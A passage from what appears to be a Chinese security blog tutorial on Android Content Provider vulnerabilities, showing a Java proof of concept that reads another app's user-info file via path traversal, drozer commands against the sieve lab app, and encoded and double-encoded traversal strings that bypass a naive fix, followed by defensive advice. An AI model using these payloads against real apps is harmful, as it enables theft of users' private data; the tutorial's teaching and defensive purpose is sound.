<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">GJContentProviderFileOperations</span><span class="params">()</span>&#123; </span><br><span class="line">    <span class="keyword">try</span>&#123; </span><br><span class="line">	    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> getContentResolver().openInputStream(Uri.parse(<span class="string">&quot;content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;</span>)); </span><br><span class="line">		<span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(); </span><br><span class="line">		<span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>]; </span><br><span class="line">		<span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> in.read(buffer); </span><br><span class="line">		<span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123; </span><br><span class="line">		    out.write(buffer, <span class="number">0</span>, n); </span><br><span class="line">			n = in.read(buffer); </span><br><span class="line">			Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show(); </span><br><span class="line">	    &#125; </span><br><span class="line">	&#125;<span class="keyword">catch</span>(Exception e)&#123; </span><br><span class="line">	    debugInfo(e.getMessage()); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>案例2：样本sieve</strong></p>
<p>我们检测文件遍历漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a &lt;包名&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/27.png" alt="image-20210922131649440"></p>
<p>我们读取系统文件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content:<span class="comment">//com.mwr.example.sieve.FileBackupProvider/etc/hosts</span></span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/28.png" alt="image-20210922131649440"></p>
<p>我们下载系统文件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.download content:<span class="comment">//com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db f:/home/database.db</span></span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/29.png" alt="image-20210922131649440"></p>
<p>案例3：</p>
<p>目标代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line"><span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span>;</span><br><span class="line"><span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">    File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,paramUri.getLastPathSegment());</span><br><span class="line">    <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以从目标代码中分析，这段代码使用android.net.Uri.getLastPathSegment()从paramUri中获取文件名，然后将其放置在预定义好的目录IMAGE_DIRECTORY中，如果该URL是encoded编码后的，那么将可能导致目录遍历漏洞</p>
<p>Android4.3开始，Uri.getLastPathSegment()内部实现调用Uri.getPathSegments()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Uri.getPathSegments()部分代码片段：  </span><br><span class="line">PathSegments <span class="title function_">getPathSegments</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(pathSegments!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> pathSegments;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> getEncoded();</span><br><span class="line">    <span class="keyword">if</span>(path==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">return</span> <span class="variable">pathSegments</span> <span class="operator">=</span> PathSegments.EMPTY;</span><br><span class="line">    &#125;</span><br><span class="line">    PathSegmentsBuilder segmentBuilder=<span class="keyword">new</span> <span class="title class_">PathSegmentsBuilder</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">previous</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> current;</span><br><span class="line">    <span class="keyword">while</span>((current=path.indexOf(<span class="string">&#x27;/&#x27;</span>,previous))&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(previous&lt;current)&#123;</span><br><span class="line">            String decodedSegment=decode(path.substring(previous,current));</span><br><span class="line">            segmentBuilder.add(decodedSegment);</span><br><span class="line">        &#125;</span><br><span class="line">        previous=current+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(previous&lt;path.length())&#123;</span><br><span class="line">        segmentBuilder.add(decode(path.substring(preyious)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pathSegments=segmentBuilder.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Uri.getPathSegments首先会通过getEncoded()获取一个路径，然后以”&#x2F;“为分隔符将path分成片段，最后调用decode()方法解码</p>
<p>假如我们传递encoded编码后的url给getLastPathSegment()，编码后的分隔符就变成了%2F,绕过了内部的分割规则，那么返回的就可能不是真正想要的文件了。这是API设计方面的问题，直接导致了目录遍历漏洞</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getLastPathSegment</span><span class="params">()</span>&#123;</span><br><span class="line">    List&lt;String&gt; segments=getPathSegments();</span><br><span class="line">    <span class="type">int</span> size=segments.size();</span><br><span class="line">    <span class="keyword">if</span>(size==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> segments.get(size-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了避免这种情况导致的目录遍历漏洞，开发者应该在传递给getLastPathSegment()之前解码，采用调用两次getLastPathSegment()方法的方式，第一次调用是为了解码，第二次调用期望得到正确的值这一部分大家可以详细参考博客：(<a target="_blank" rel="noopener" href="https://tea9.xyz/post/758430476.html">https://tea9.xyz/post/758430476.html</a>)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line">    <span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span> <span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">        File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());</span><br><span class="line">        <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">这个编码后的URL： ..%<span class="number">2F</span>..%<span class="number">2F</span>..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml   </span><br><span class="line">第一次调用getLastPathSegment()，会返回../../../data/data/com.example.android.app/shared_prefs/Example.xml。   </span><br><span class="line">第二次调用getLastPathSegment()会返回Example.xml  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然而攻击者可以采用一种叫做<span class="string">&quot;Double Encoding&quot;</span>的技术，使得第一次调用getLastPathSegment()后无法解码。 </span><br><span class="line"></span><br><span class="line">比如下面经过<span class="type">double</span> encoded后的string就可以绕过上面这种防御</span><br><span class="line"></span><br><span class="line">%252E%252E%<span class="number">252F</span>%252E%252E%<span class="number">252F</span>%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared_prefs%252FExample.xml </span><br><span class="line"></span><br><span class="line">第一次解码后： %2E%2E%<span class="number">2F</span>%2E%2E%<span class="number">2F</span>%2E%2E%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml</span><br><span class="line"></span><br><span class="line">第二次解码后： ../../../data/data/com.example.android.app/shared_prefs/Example.xml </span><br><span class="line">仍会导致目录遍历。所以简单的解码后再传人也是不够的，仍然需要严格校验以确保path是期望的路径。</span><br></pre></td></tr></table></figure>

<h4 id="（3）安全防护-2"><a href="#（3）安全防护-2" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 将不必要导出的Content Provider设置为不导出</span><br><span class="line"><span class="number">2.</span> 去除没有必要的openFile()接口</span><br><span class="line"><span class="number">3.</span> 过滤限制跨域访问，对访问的目标文件的路径进行有效判断</span><br><span class="line"><span class="number">4.</span> 设置权限来进行内部应用通过Content Provider的数据共享</span><br></pre></td></tr></table></figure>

<h2 id="四、实验总结"><a href="#四、实验总结" class="headerlink" title="四、实验总结"></a>四、实验总结</h2><p>本文对Content Provider内容提供器的基本原理做了一个详细讲解，然后对Provider常见的一些漏洞情况作了分析，这里面一部分漏洞来自于漏洞平台，一部分来自于网上的博客收集总结，还提供了一个样例sieve.apk，初步的实现信息泄露、SQL注入、目录遍历漏洞的基本操作方式，也介绍了一般挖掘provider漏洞的基本方法，其中关于drozer的具体操作使用，大家可以参考之前的博客：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269196.htm">Android漏洞挖掘三板斧——drozer+Inspeckage(Xposed)+MobSF</a>，当然可能对于Provider中的漏洞介绍还不是很全面，其他的就请各位大佬指正了。</p>
<h2 id="五、参考文献"><a href="#五、参考文献" class="headerlink" title="五、参考文献"></a>五、参考文献</h2><p>Content Provider原理介绍</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.cnblogs.com/tgyf/p/4696288.html</span></span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/5e13d1fec9c9</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/huansky/p/13785634.html</span></span><br><span class="line">http:<span class="comment">//www.tutorialspoint.com/android/android_content_providers.htm</span></span><br></pre></td></tr></table></figure>

<p>Content Provider漏洞挖掘</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//tea9.xyz/post/758430476.html</span></span><br><span class="line">https:<span class="comment">//ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</span></span><br><span class="line">https:<span class="comment">//wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0156386</span></span><br><span class="line">http:<span class="comment">//www.feidao.site/wordpress/?p=3295</span></span><br><span class="line">http:<span class="comment">//www.hackdig.com/03/hack-19497.htm</span></span><br><span class="line">https:<span class="comment">//mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</span></span><br></pre></td></tr></table></figure>


    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>安全后厨团队 |  微信公众号【安全后厨】
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://security-kitchen.com/2023/02/13/bug0012/" title="Android App漏洞之战（12）——Content Provider漏洞详解">http://security-kitchen.com/2023/02/13/bug0012/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag"># 漏洞挖掘</a>
              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/02/13/bug0011/" rel="prev" title="Android App漏洞之战（11）——Broadcast Recevier漏洞详解">
      <i class="fa fa-chevron-left"></i> Android App漏洞之战（11）——Broadcast Recevier漏洞详解
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/02/13/bug0013/" rel="next" title="Android App漏洞之战（13）——权限安全和安全配置漏洞详解">
      Android App漏洞之战（13）——权限安全和安全配置漏洞详解 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Content-Provider%E5%88%9D%E6%AD%A5%E4%BB%8B%E7%BB%8D"><span class="nav-text">二、Content Provider初步介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Content-Provider%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">1.Content Provider的基本原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89Content-Provider%E7%AE%80%E4%BB%8B"><span class="nav-text">（1）Content Provider简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89Content-Provider%E4%BD%9C%E7%94%A8"><span class="nav-text">（2）Content Provider作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89URI%E8%AF%A6%E8%A7%A3"><span class="nav-text">（3）URI详解</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#URI"><span class="nav-text">URI:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MIME"><span class="nav-text">MIME:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#URI%E8%A7%A3%E6%9E%90"><span class="nav-text">URI解析:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%884%EF%BC%89Content-Provider%E6%95%B0%E6%8D%AE%E5%85%B1%E4%BA%AB"><span class="nav-text">（4）Content Provider数据共享</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%885%EF%BC%89Content-Resolver%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE"><span class="nav-text">（5）Content Resolver操作数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%886%EF%BC%89Content-Provider%E4%BD%BF%E7%94%A8"><span class="nav-text">（6）Content Provider使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Content-Provider%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%A7%8D%E7%B1%BB%E5%92%8C%E5%8D%B1%E5%AE%B3"><span class="nav-text">2.Content Provider漏洞的种类和危害</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Content-Provider%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0"><span class="nav-text">三、Content Provider漏洞原理分析和复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95"><span class="nav-text">1.漏洞挖掘方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%9F%A5%E6%89%BE%E5%AF%BC%E5%87%BAProvider"><span class="nav-text">（1）查找导出Provider</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%9F%A5%E6%89%BEURI"><span class="nav-text">（2）查找URI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E6%96%B9%E6%B3%95%E4%BD%BF%E7%94%A8"><span class="nav-text">（3）方法使用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="nav-text">2.信息泄露漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D"><span class="nav-text">（1）原理介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">（2）漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="nav-text">（3）安全防护</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">3.SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D-1"><span class="nav-text">（1）原理介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-text">（2）漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4-1"><span class="nav-text">（3）安全防护</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="nav-text">4.目录遍历漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D-2"><span class="nav-text">（1）原理介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="nav-text">（2）漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4-2"><span class="nav-text">（3）安全防护</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="nav-text">四、实验总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-text">五、参考文献</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="安全后厨团队"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">安全后厨团队</p>
  <div class="site-description" itemprop="description">选择有时候比努力更重要</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">52</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/WindXaa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;WindXaa" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://bbs.pediy.com/user-home-905443.htm" title="看雪 → https:&#x2F;&#x2F;bbs.pediy.com&#x2F;user-home-905443.htm" rel="noopener" target="_blank"><i class="gratipay fa-fw"></i>看雪</a>
      </span>
  </div>



      </div>
	  
	  <div class="wechat_OA">
		<span><b>公众号</b></span>
		<br>
		<!-- 这里添加你的二维码图片 -->
		<img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/weChat.jpg" alt="二维码">
	  </div>
	  <div class="wechat_OA">
		<span><b>知识星球</b></span>
		<br>
		<!-- 这里添加你的二维码图片 -->
		<img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website%2Fstar.png" alt="知识星球">
	  </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2022-12 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">安全后厨团队</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>
<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共189.4k字</span>
</div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
